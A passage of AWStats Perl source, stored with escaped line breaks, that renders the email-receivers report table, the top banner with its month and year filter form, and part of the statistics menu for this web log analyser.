\"\\\"$NewLinkTarget>$Message[9]</a>\";\n\t\t}\n\t}\n\t&tab_head( \"$title\", 19, 0, 'emailreceivers' );\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th colspan=\\\"3\\\">$Message[132] : \"\n\t  . ( scalar keys %_emailr_h ) . \"</th>\";\n\tif ( $ShowEMailReceivers =~ /H/i ) {\n\t\tprint \"<th rowspan=\\\"2\\\" bgcolor=\\\"#$color_h\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(4)\n\t\t  . \">$Message[57]</th>\";\n\t}\n\tif ( $ShowEMailReceivers =~ /B/i ) {\n\t\tprint\n\"<th class=\\\"datasize\\\" rowspan=\\\"2\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(5)\n\t\t  . \">$Message[75]</th>\";\n\t}\n\tif ( $ShowEMailReceivers =~ /M/i ) {\n\t\tprint\n\"<th rowspan=\\\"2\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[106]</th>\";\n\t}\n\tif ( $ShowEMailReceivers =~ /L/i ) {\n\t\tprint \"<th rowspan=\\\"2\\\" width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th width=\\\"30%\\\">Local</th><th>&nbsp;</th><th width=\\\"30%\\\">External</th></tr>\";\n\t$total_p = $total_h = $total_k = 0;\n\t$max_h = 1;\n\tforeach ( values %_emailr_h ) {\n\t\tif ( $_ > $max_h ) { $max_h = $_; }\n\t}\n\t$max_k = 1;\n\tforeach ( values %_emailr_k ) {\n\t\tif ( $_ > $max_k ) { $max_k = $_; }\n\t}\n\tmy $count = 0;\n\tif ( !$HTMLOutput{'allemailr'} && !$HTMLOutput{'lastemailr'} ) {\n\t\t&BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \\%_emailr_h,\n\t\t\t\\%_emailr_h );\n\t}\n\tif ( $HTMLOutput{'allemailr'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \\%_emailr_h,\n\t\t\t\\%_emailr_h );\n\t}\n\tif ( $HTMLOutput{'lastemailr'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \\%_emailr_h,\n\t\t\t\\%_emailr_l );\n\t}\n\tforeach my $key (@keylist) {\n\t\tmy $newkey = $key;\n\t\tif ( length($key) > $MaxLengthOfShownEMail ) {\n\t\t\t$newkey = substr( $key, 0, $MaxLengthOfShownEMail ) . \"...\";\n\t\t}\n\t\tmy $bredde_h = 0;\n\t\tmy $bredde_k = 0;\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_h = int( $BarWidth * $_emailr_h{$key} / $max_h ) + 1;\n\t\t}\n\t\tif ( $max_k > 0 ) {\n\t\t\t$bredde_k = int( $BarWidth * $_emailr_k{$key} / $max_k ) + 1;\n\t\t}\n\t\tprint \"<tr>\";\n\t\tmy $direction = IsLocalEMail($key);\n\n\t\tif ( $direction > 0 ) {\n\t\t\tprint \"<td class=\\\"aws\\\">$newkey</td><td>&lt;-</td><td>&nbsp;</td>\";\n\t\t}\n\t\tif ( $direction == 0 ) {\n\t\t\tprint\n\"<td colspan=\\\"3\\\"><span style=\\\"color: #$color_other\\\">$newkey</span></td>\";\n\t\t}\n\t\tif ( $direction < 0 ) {\n\t\t\tprint \"<td class=\\\"aws\\\">&nbsp;</td><td>-&gt;</td><td>$newkey</td>\";\n\t\t}\n\t\tif ( $ShowEMailReceivers =~ /H/i ) {\n\t\t\tprint \"<td>$_emailr_h{$key}</td>\";\n\t\t}\n\t\tif ( $ShowEMailReceivers =~ /B/i ) {\n\t\t\tprint \"<td nowrap=\\\"nowrap\\\">\"\n\t\t\t  . Format_Bytes( $_emailr_k{$key} ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowEMailReceivers =~ /M/i ) {\n\t\t\tprint \"<td nowrap=\\\"nowrap\\\">\"\n\t\t\t  . Format_Bytes( $_emailr_k{$key} / ( $_emailr_h{$key} || 1 ) )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowEMailReceivers =~ /L/i ) {\n\t\t\tprint \"<td nowrap=\\\"nowrap\\\">\"\n\t\t\t  . ( $_emailr_l{$key} ? Format_Date( $_emailr_l{$key}, 1 ) : '-' )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\n\t\t#$total_p += $_emailr_p{$key};\n\t\t$total_h += $_emailr_h{$key};\n\t\t$total_k += $_emailr_k{$key};\n\t\t$count++;\n\t}\n\t$rest_p = 0;                        # $rest_p=$TotalPages-$total_p;\n\t$rest_h = $TotalHits - $total_h;\n\t$rest_k = $TotalBytes - $total_k;\n\tif ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )\n\t{                                   # All other receiver emails\n\t\tprint\n\"<tr><td colspan=\\\"3\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tif ( $ShowEMailReceivers =~ /H/i ) { print \"<td>$rest_h</td>\"; }\n\t\tif ( $ShowEMailReceivers =~ /B/i ) {\n\t\t\tprint \"<td nowrap=\\\"nowrap\\\">\" . Format_Bytes($rest_k) . \"</td>\";\n\t\t}\n\t\tif ( $ShowEMailReceivers =~ /M/i ) {\n\t\t\tprint \"<td nowrap=\\\"nowrap\\\">\"\n\t\t\t  . Format_Bytes( $rest_k / ( $rest_h || 1 ) ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowEMailReceivers =~ /L/i ) { print \"<td>&nbsp;</td>\"; }\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the top banner of the inner frame or static page\n# Parameters:   $WIDTHMENU1\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLTopBanner{\n\tmy $WIDTHMENU1 = shift;\n\tmy $frame = ( $FrameName eq 'mainleft' );\n\n\tif ($Debug) { debug( \"ShowTopBan\", 2 ); }\n\tprint \"$Center<a name=\\\"menu\\\">&nbsp;</a>\\n\";\n\n\tif ( $FrameName ne 'mainleft' ) {\n\t\tmy $NewLinkParams = ${QueryString};\n\t\t$NewLinkParams =~ s/(^|&|&amp;)update(=\\w*|$)//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\\w*|$)//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)year=[^&]*//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)month=[^&]*//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;\n\t\t$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;\n\t\t$NewLinkParams =~ s/^&amp;//;\n\t\t$NewLinkParams =~ s/&amp;$//;\n\t\tmy $NewLinkTarget = '';\n\n\t\tif ( $FrameName eq 'mainright' ) {\n\t\t\t$NewLinkTarget = \" target=\\\"_parent\\\"\";\n\t\t}\n\t\tprint \"<form name=\\\"FormDateFilter\\\" action=\\\"\"\n\t\t  . XMLEncode(\"$AWScript${NewLinkParams}\")\n\t\t  . \"\\\" style=\\\"padding: 0px 0px 20px 0px; margin-top: 0\\\"$NewLinkTarget>\\n\";\n\t}\n\n\tif ( $QueryString !~ /buildpdf/i ) {\n\t\tprint\n\"<table class=\\\"aws_border\\\" border=\\\"0\\\" cellpadding=\\\"2\\\" cellspacing=\\\"0\\\" width=\\\"100%\\\">\\n\";\n\t\tprint \"<tr><td>\\n\";\n\t\tprint\n\"<table class=\\\"aws_data sortable\\\" border=\\\"0\\\" cellpadding=\\\"1\\\" cellspacing=\\\"0\\\" width=\\\"100%\\\">\\n\";\n\t}\n\telse {\n\t\tprint \"<table width=\\\"100%\\\">\\n\";\n\t}\n\n\tif ( $FrameName ne 'mainright' ) {\n\n\t\t# Print Statistics Of\n\t\tif ( $FrameName eq 'mainleft' ) {\n\t\t\tmy $shortSiteDomain = $SiteDomain;\n\t\t\tif ( length($SiteDomain) > 30 ) {\n\t\t\t\t$shortSiteDomain =\n\t\t\t\t    substr( $SiteDomain, 0, 20 ) . \"...\"\n\t\t\t\t  . substr( $SiteDomain, length($SiteDomain) - 5, 5 );\n\t\t\t}\n\t\t\tprint\n\"<tr><td class=\\\"awsm\\\"><b>$Message[7]:</b></td></tr><tr><td class=\\\"aws\\\"><span style=\\\"font-size: 12px;\\\">$shortSiteDomain</span></td>\";\n\t\t}\n\t\telse {\n\t\t\tprint\n\"<tr><td class=\\\"aws\\\" valign=\\\"middle\\\"><b>$Message[7]:</b>&nbsp;</td><td class=\\\"aws\\\" valign=\\\"middle\\\"><span style=\\\"font-size: 14px;\\\">$SiteDomain</span></td>\";\n\t\t}\n\n\t\t# Logo and flags\n\t\tif ( $FrameName ne 'mainleft' ) {\n\t\t\tif ( $LogoLink =~ \"http://www.awstats.org\" ) {\n\t\t\t\tprint \"<td align=\\\"right\\\" rowspan=\\\"3\\\"><a href=\\\"\"\n\t\t\t\t  . XMLEncode($LogoLink)\n\t\t\t\t  . \"\\\" target=\\\"awstatshome\\\"><img src=\\\"$DirIcons/other/$Logo\\\" border=\\\"0\\\"\"\n\t\t\t\t  . AltTitle( ucfirst($PROG) . \" Web Site\" )\n\t\t\t\t  . \" /></a>\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint \"<td align=\\\"right\\\" rowspan=\\\"3\\\"><a href=\\\"\"\n\t\t\t\t  . XMLEncode($LogoLink)\n\t\t\t\t  . \"\\\" target=\\\"awstatshome\\\"><img src=\\\"$DirIcons/other/$Logo\\\" border=\\\"0\\\" /></a>\";\n\t\t\t}\n\t\t\tif ( !$StaticLinks ) { print \"<br />\"; Show_Flag_Links($Lang); }\n\t\t\tprint \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t}\n\tif ( $FrameName ne 'mainleft' ) {\n\n\t\t# Print Last Update\n\t\tprint\n\"<tr valign=\\\"middle\\\"><td class=\\\"aws\\\" valign=\\\"middle\\\" width=\\\"$WIDTHMENU1\\\"><b>$Message[35]:</b>&nbsp;</td>\";\n\t\tprint\n\"<td class=\\\"aws\\\" valign=\\\"middle\\\"><span style=\\\"font-size: 12px;\\\">\";\n\t\tif ($LastUpdate) { print Format_Date( $LastUpdate, 0 ); }\n\t\telse {\n\n\t\t\t# Here NbOfOldLines = 0 (because LastUpdate is not defined)\n\t\t\tif ( !$UpdateStats ) {\n\t\t\t\tprint \"<span style=\\\"color: #880000\\\">$Message[24]</span>\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint\n \"<span style=\\\"color: #880000\\\">No qualified records found in log \n ($NbOfLinesCorrupted corrupted, $NbOfLinesComment comments, $NbOfLinesBlank Blank, \n $NbOfLinesDropped dropped)</span>\";\n\t\t\t}\n\t\t}\n\t\tprint \"</span>\";\n\n\t\t# Print Update Now link\n\t\tif ( $AllowToUpdateStatsFromBrowser && !$StaticLinks ) {\n\t\t\tmy $NewLinkParams = ${QueryString};\n\t\t\t$NewLinkParams =~ s/(^|&|&amp;)update(=\\w*|$)//i;\n\t\t\t$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\\w*|$)//i;\n\t\t\t$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;\n\t\t\tif ( $FrameName eq 'mainright' ) {\n\t\t\t\t$NewLinkParams .= \"&amp;framename=mainright\";\n\t\t\t}\n\t\t\t$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;\n\t\t\t$NewLinkParams =~ s/^&amp;//;\n\t\t\t$NewLinkParams =~ s/&amp;$//;\n\t\t\tif ($NewLinkParams) { $NewLinkParams = \"${NewLinkParams}&amp;\"; }\n\t\t\tprint \"&nbsp; &nbsp; &nbsp; &nbsp;\";\n\t\t\tprint \"<a href=\\\"\"\n\t\t\t  . XMLEncode(\"$AWScript${NewLinkParams}update=1\")\n\t\t\t  . \"\\\">$Message[74]</a>\";\n\t\t}\n\t\tprint \"</td>\";\n\n\t\t# Logo and flags\n\t\tif ( $FrameName eq 'mainright' ) {\n\t\t\tif ( $LogoLink =~ \"http://www.awstats.org\" ) {\n\t\t\t\tprint \"<td align=\\\"right\\\" rowspan=\\\"2\\\"><a href=\\\"\"\n\t\t\t\t  . XMLEncode($LogoLink)\n\t\t\t\t  . \"\\\" target=\\\"awstatshome\\\"><img src=\\\"$DirIcons/other/$Logo\\\" border=\\\"0\\\"\"\n\t\t\t\t  . AltTitle( ucfirst($PROG) . \" Web Site\" )\n\t\t\t\t  . \" /></a>\\n\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint \"<td align=\\\"right\\\" rowspan=\\\"2\\\"><a href=\\\"\"\n\t\t\t\t  . XMLEncode($LogoLink)\n\t\t\t\t  . \"\\\" target=\\\"awstatshome\\\"><img src=\\\"$DirIcons/other/$Logo\\\" border=\\\"0\\\" /></a>\\n\";\n\t\t\t}\n\t\t\tif ( !$StaticLinks ) { print \"<br />\"; Show_Flag_Links($Lang); }\n\t\t\tprint \"</td>\";\n\t\t}\n\n\t\tprint \"</tr>\\n\";\n\n\t\t# Print selected period of analysis (month and year required)\n\t\tprint\n\"<tr><td class=\\\"aws\\\" valign=\\\"middle\\\"><b>$Message[133]:</b></td>\";\n\t\tprint \"<td class=\\\"aws\\\" valign=\\\"middle\\\">\";\n\t\tif ( $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks ) {\n\t\t\tprint \"<select class=\\\"aws_formfield\\\" name=\\\"month\\\">\\n\";\n\t\t\tforeach ( 1 .. 12 ) {\n\t\t\t\tmy $monthix = sprintf( \"%02s\", $_ );\n\t\t\t\tprint \"<option\"\n\t\t\t\t  . (\n\t\t\t\t\t  \"$MonthRequired\" eq \"$monthix\"\n\t\t\t\t\t? \" selected=\\\"selected\\\"\"\n\t\t\t\t\t: \"\"\n\t\t\t\t  )\n\t\t\t\t  . \" value=\\\"$monthix\\\">$MonthNumLib{$monthix}</option>\\n\";\n\t\t\t}\n\t\t\tif ( $AllowFullYearView >= 2 ) {\n\t\t\t\tprint \"<option\"\n\t\t\t\t  . ( $MonthRequired eq 'all' ? \" selected=\\\"selected\\\"\" : \"\" )\n\t\t\t\t  . \" value=\\\"all\\\">- $Message[6] -</option>\\n\";\n\t\t\t}\n\t\t\tprint \"</select>\\n\";\n\t\t\tprint \"<select class=\\\"aws_formfield\\\" name=\\\"year\\\">\\n\";\n\n\t\t\t# Add YearRequired in list if not in ListOfYears\n\t\t\t$ListOfYears{$YearRequired} ||= $MonthRequired;\n\t\t\tforeach ( sort keys %ListOfYears ) {\n\t\t\t\tprint \"<option\"\n\t\t\t\t  . ( $YearRequired eq \"$_\" ? \" selected=\\\"selected\\\"\" : \"\" )\n\t\t\t\t  . \" value=\\\"$_\\\">$_</option>\\n\";\n\t\t\t}\n\t\t\tprint \"</select>\\n\";\n\t\t\tprint \"<input type=\\\"hidden\\\" name=\\\"output\\\" value=\\\"\"\n\t\t\t  . join( ',', keys %HTMLOutput )\n\t\t\t  . \"\\\" />\\n\";\n\t\t\tif ($SiteConfig) {\n\t\t\t\tprint\n\"<input type=\\\"hidden\\\" name=\\\"config\\\" value=\\\"$SiteConfig\\\" />\\n\";\n\t\t\t}\n\t\t\tif ($DirConfig) {\n\t\t\t\tprint\n\"<input type=\\\"hidden\\\" name=\\\"configdir\\\" value=\\\"$DirConfig\\\" />\\n\";\n\t\t\t}\n\t\t\tif ( $QueryString =~ /lang=(\\w+)/i ) {\n\t\t\t\tprint\n\t\t\t\t  \"<input type=\\\"hidden\\\" name=\\\"lang\\\" value=\\\"$1\\\" />\\n\";\n\t\t\t}\n\t\t\tif ( $QueryString =~ /debug=(\\d+)/i ) {\n\t\t\t\tprint\n\t\t\t\t  \"<input type=\\\"hidden\\\" name=\\\"debug\\\" value=\\\"$1\\\" />\\n\";\n\t\t\t}\n\t\t\tif ( $FrameName eq 'mainright' ) {\n\t\t\t\tprint\n\"<input type=\\\"hidden\\\" name=\\\"framename\\\" value=\\\"index\\\" />\\n\";\n\t\t\t}\n\t\t\tprint\n\"<input type=\\\"submit\\\" value=\\\" $Message[115] \\\" class=\\\"aws_button\\\" />\";\n\t\t}\n\t\telse {\n\t\t\tprint \"<span style=\\\"font-size: 14px;\\\">\";\n\t\t\tif ($DayRequired) { print \"$Message[4] $DayRequired - \"; }\n\t\t\tif ( $MonthRequired eq 'all' ) {\n\t\t\t\tprint \"$Message[6] $YearRequired\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint\n\t\t\t\t  \"$Message[5] $MonthNumLib{$MonthRequired} $YearRequired\";\n\t\t\t}\n\t\t\tprint \"</span>\";\n\t\t}\n\t\tprint \"</td></tr>\\n\";\n\t}\n\tif ( $QueryString !~ /buildpdf/i ) {\n\t\tprint \"</table>\\n\";\n\t\tprint \"</td></tr></table>\\n\";\n\t}\n\telse {\n\t\tprint \"</table>\\n\";\n\t}\n\n\tif ( $FrameName ne 'mainleft' ) { print \"</form><br />\\n\"; }\n\telse { print \"<br />\\n\"; }\n\tprint \"\\n\";\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the menu in a frame or below the top banner\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMenu{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\tmy $frame = ( $FrameName eq 'mainleft' );\n\n\tif ($Debug) { debug( \"ShowMenu\", 2 ); }\n\n\t# Print menu links\n\tif ( ( $HTMLOutput{'main'} && $FrameName ne 'mainright' )\n\t\t|| $FrameName eq 'mainleft' )\n\t{    # If main page asked\n\t\t    # Define link anchor\n\t\tmy $linkanchor =\n\t\t  ( $FrameName eq 'mainleft' ? \"$AWScript${NewLinkParams}\" : \"\" );\n\t\tif ( $linkanchor && ( $linkanchor !~ /framename=mainright/ ) ) {\n\t\t\t$linkanchor .= \"framename=mainright\";\n\t\t}\n\t\t$linkanchor =~ s/(&|&amp;)$//;\n\t\t$linkanchor = XMLEncode(\"$linkanchor\");\n\n\t\t# Define target\n\t\tmy $targetpage =\n\t\t  ( $FrameName eq 'mainleft' ? \" target=\\\"mainright\\\"\" : \"\" );\n\n\t\t# Print Menu\n\t\tmy $linetitle;    # TODO a virer\n\t\tif ( !$PluginsLoaded{'ShowMenu'}{'menuapplet'} ) {\n\t\t\tmy $menuicon = 0;    # TODO a virer\n\t\t\t                     # Menu HTML\n\t\t\tprint \"<table\"\n\t\t\t  . (\n\t\t\t\t$frame\n\t\t\t\t? \" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" border=\\\"0\\\"\"\n\t\t\t\t: \"\"\n\t\t\t  )\n\t\t\t  . \">\\n\";\n\t\t\tif ( $FrameName eq 'mainleft' && $ShowMonthStats ) {\n\t\t\t\tprint( $frame? \"<tr><td class=\\\"awsm\\\">\" : \"\" );\n\t\t\t\tprint\n\"<a href=\\\"$linkanchor#top\\\"$targetpage>$Message[128]</a>\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tmy %menu     = ();\n\t\t\tmy %menulink = ();\n\t\t\tmy %menutext = ();\n\n\t\t\t# When\n\t\t\t%menu = (\n\t\t\t\t'month'       => $ShowMonthStats       ? 1 : 0,\n\t\t\t\t'daysofmonth' => $ShowDaysOfMonthStats ? 2 : 0,\n\t\t\t\t'daysofweek'  => $ShowDaysOfWeekStats  ? 3 : 0,\n\t\t\t\t'hours'       => $ShowHoursStats       ? 4 : 0\n\t\t\t);\n\t\t\t%menulink = (\n\t\t\t\t'month'       => 1,\n\t\t\t\t'daysofmonth' => 1,\n\t\t\t\t'daysofweek'  => 1,\n\t\t\t\t'hours'       => 1\n\t\t\t);\n\t\t\t%menutext = (\n\t\t\t\t'month'       => $Message[162],\n\t\t\t\t'daysofmonth' => $Message[138],\n\t\t\t\t'daysofweek'  => $Message[91],\n\t\t\t\t'hours'       => $Message[20]\n\t\t\t);\n\t\t\tHTMLShowMenuCateg(\n\t\t\t\t'when',         $Message[93],\n\t\t\t\t'menu4.png',    $frame,\n\t\t\t\t$targetpage,    $linkanchor,\n\t\t\t\t$NewLinkParams, $NewLinkTarget,\n\t\t\t\t\\%menu,         \\%menulink,\n\t\t\t\t\\%menutext\n\t\t\t);\n\n\t\t\t# Who\n\t\t\t%menu = (\n\t\t\t\t'countries'  => $ShowDomainsStats ? 1 : 0,\n\t\t\t\t'alldomains' => $ShowDomainsStats ? 2 : 0,\n\t\t\t\t'visitors'   => $ShowHostsStats   ? 3 : 0,\n\t\t\t\t'allhosts'   => $ShowHostsStats   ? 4 : 0,\n\t\t\t\t'lasthosts' => ( $ShowHostsStats =~ /L/i ) ? 5 : 0,\n\t\t\t\t'unknownip' => $ShowHostsStats         ? 6 : 0,\n\t\t\t\t'logins'    => $ShowAuthenticatedUsers ? 7 : 0,\n\t\t\t\t'alllogins' => $ShowAuthenticatedUsers ? 8 : 0,\n\t\t\t\t'lastlogins' => ( $ShowAuthenticatedUsers =~ /L/i ) ? 9 : 0,\n\t\t\t\t'emailsenders' => $ShowEMailSenders ? 10 : 0,\n\t\t\t\t'allemails'    => $ShowEMailSenders ? 11 : 0,\n\t\t\t\t'lastemails' => ( $ShowEMailSenders =~ /L/i ) ? 12 : 0,\n\t\t\t\t'emailreceivers' => $ShowEMailReceivers ? 13 : 0,\n\t\t\t\t'allemailr'      => $ShowEMailReceivers ? 14 : 0,\n\t\t\t\t'lastemailr' => ( $ShowEMailReceivers =~ /L/i ) ? 15 : 0,\n\t\t\t\t'robots'    => $ShowRobotsStats ? 16 : 0,\n\t\t\t\t'allrobots' => $ShowRobotsStats ? 17 : 0,\n\t\t\t\t'lastrobots' => ( $ShowRobotsStats =~ /L/i ) ? 18 : 0,\n\t\t\t\t'worms' => $ShowWormsStats ? 19 : 0\n\t\t\t);\n\t\t\t%menulink = (\n\t\t\t\t'countries'      => 1,\n\t\t\t\t'alldomains'     => 2,\n\t\t\t\t'visitors'       => 1,\n\t\t\t\t'allhosts'       => 2,\n\t\t\t\t'lasthosts'      => 2,\n\t\t\t\t'unknownip'      => 2,\n\t\t\t\t'logins'         => 1,\n\t\t\t\t'alllogins'      => 2,\n\t\t\t\t'lastlogins'     => 2,\n\t\t\t\t'emailsenders'   => 1,\n\t\t\t\t'allemails'      => 2,\n\t\t\t\t'lastemails'     => 2,\n\t\t\t\t'emailreceivers' => 1,\n\t\t\t\t'allemailr'      => 2,\n\t\t\t\t'lastemailr'     => 2,\n\t\t\t\t'robots'         => 1,\n\t\t\t\t'allrobots'      => 2,\n\t\t\t\t'lastrobots'     => 2,\n\t\t\t\t'worms'          => 1\n\t\t\t);\n\t\t\t%menutext = (\n\t\t\t\t'countries'      => $Message[148],\n\t\t\t\t'alldomains'     => $Message[80],\n\t\t\t\t'visitors'       => $Message[81],\n\t\t\t\t'allhosts'       => $Message[80],\n\t\t\t\t'lasthosts'      => $Message[9],\n\t\t\t\t'unknownip'      => $Message[45],\n\t\t\t\t'logins'         => $Message[94],\n\t\t\t\t'alllogins'      => $Message[80],\n\t\t\t\t'lastlogins'     => $Message[9],\n\t\t\t\t'emailsenders'   => $Message[131],\n\t\t\t\t'allemails'      => $Message[80],\n\t\t\t\t'lastemails'     => $Message[9],\n\t\t\t\t'emailreceivers' => $Message[132],\n\t\t\t\t'allemailr'      => $Message[80],\n\t\t\t\t'lastemailr'     => $Message[9],\n\t\t\t\t'robots'         => $Message[53],\n\t\t\t\t'allrobots'      => $Message[80],\n\t\t\t\t'lastrobots'     => $Message[9],\n\t\t\t\t'worms'          => $Message[136]\n\t\t\t);\n\t\t\tHTMLShowMenuCateg(\n\t\t\t\t'who',          $Message[92],\n\t\t\t\t'menu5.png',    $frame,\n\t\t\t\t$targetpage,    $linkanchor,\n\t\t\t\t$NewLinkParams, $NewLinkTarget,\n\t\t\t\t\\%menu,         \\%menulink,\n\t\t\t\t\\%menutext\n\t\t\t);\n\n\t\t\t# Navigation\n\t\t\t$linetitle = &AtLeastOneNotNull(\n\t\t\t\t$ShowSessionsStats,  $ShowPagesStats,\n\t\t\t\t$ShowFileTypesStats, $ShowFileSizesStats,\n\t\t\t\t$ShowOSStats,        $ShowBrowsersStats,\n\t\t\t\t$ShowScreenSizeStats, $ShowDownloadsStats\n\t\t\t);\n\t\t\tif ($linetitle) {\n\t\t\t\tprint \"<tr><td class=\\\"awsm\\\"\"\n\t\t\t\t  . ( $frame ? \"\" : \" valign=\\\"top\\\"\" ) . \">\"\n\t\t\t\t  . (\n\t\t\t\t\t$menuicon\n\t\t\t\t\t? \"<img src=\\\"$DirIcons/other/menu2.png\\\" />&nbsp;\"\n\t\t\t\t\t: \"\"\n\t\t\t\t  )\n\t\t\t\t  . \"<b>$Message[72]:</b></td>\\n\";\n\t\t\t}\n\t\t\tif ($linetitle) {\n\t\t\t\tprint( $frame? \"</tr>\\n\" : \"<td class=\\\"awsm\\\">\" );\n\t\t\t}\n\t\t\tif ($ShowSessionsStats) {\n\t\t\t\tprint( $frame? \"<tr><td class=\\\"awsm\\\">\" : \"\" );\n\t\t\t\tprint\n\"<a href=\\\"$linkanchor#sessions\\\"$targetpage>$Message[117]</a>\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowFileTypesStats && $LevelForFileTypesDetection > 0) {\n\t\t\t\tprint( $frame? \"<tr><td class=\\\"awsm\\\">\" : \"\" );\n\t\t\t\tprint\n\"<a href=\\\"$linkanchor#filetypes\\\"$targetpage>$Message[73]</a>\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowDownloadsStats && $LevelForFileTypesDetection > 0) {\n\t\t\t\tprint( $frame? \"<tr><td class=\\\"awsm\\\">\" : \"\" );\n\t\t\t\tprint\n\"<a href=\\\"$linkanchor#downloads\\\"$targetpage>$Message[178]</a>\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t\tprint( $frame\n\t\t\t\t\t? \"<tr><td class=\\\"awsm\\\"> &nbsp; <img height=\\\"8\\\" width=\\\"9\\\" src=\\\"$DirIcons/other/page.png\\\" alt=\\\"...\\\" /> \"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t\tprint \"<a href=\\\"\"\n\t\t\t\t  . (\n\t\t\t\t\t$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks\n\t\t\t\t\t? XMLEncode(\n\t\t\t\t\t\t\"$AWScript${NewLinkParams}output=downloads\")\n\t\t\t\t\t: \"$StaticLinks.downloads.$StaticExt\"\n\t\t\t\t  )\n\t\t\t\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\\n\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowPagesStats) {\n\t\t\t\tprint( $frame? \"<tr><td class=\\\"awsm\\\">\" : \"\" );\n\t\t\t\tprint\n\"<a href=\\\"$linkanchor#urls\\\"$targetpage>$Message[29]</a>\\n\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowPagesStats) {\n\t\t\t\tprint( $frame\n\t\t\t\t\t? \"<tr><td class=\\\"awsm\\\"> &nbsp; <img height=\\\"8\\\" width=\\\"9\\\" src=\\\"$DirIcons/other/page.png\\\" alt=\\\"...\\\" /> \"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t\tprint \"<a href=\\\"\"\n\t\t\t\t  . (\n\t\t\t\t\t$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks\n\t\t\t\t\t? XMLEncode(\n\t\t\t\t\t\t\"$AWScript${NewLinkParams}output=urldetail\")\n\t\t\t\t\t: \"$StaticLinks.urldetail.$StaticExt\"\n\t\t\t\t  )\n\t\t\t\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\\n\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ( $ShowPagesStats =~ /E/i ) {\n\t\t\t\tprint( $frame\n\t\t\t\t\t? \"<tr><td class=\\\"awsm\\\"> &nbsp; <img height=\\\"8\\\" width=\\\"9\\\" src=\\\"$DirIcons/other/page.png\\\" alt=\\\"...\\\" /> \"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t\tprint \"<a href=\\\"\"\n\t\t\t\t  . (\n\t\t\t\t\t$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks\n\t\t\t\t\t? XMLEncode(\n\t\t\t\t\t\t\"$AWScript${NewLinkParams}output=urlentry\")\n\t\t\t\t\t: \"$StaticLinks.urlentry.$StaticExt\"\n\t\t\t\t  )\n\t\t\t\t  . \"\\\"$NewLinkTarget>$Message[104]</a>\\n\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ( $ShowPagesStats =~ /X/i ) {\n\t\t\t\tprint( $frame\n\t\t\t\t\t? \"<tr><td class=\\\"awsm\\\"> &nbsp; <img height=\\\"8\\\" width=\\\"9\\\" src=\\\"$DirIcons/other/page.png\\\" alt=\\\"...\\\" /> \"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t\tprint \"<a href=\\\"\"\n\t\t\t\t  . (\n\t\t\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t\t\t  || !$StaticLinks\n\t\t\t\t\t? 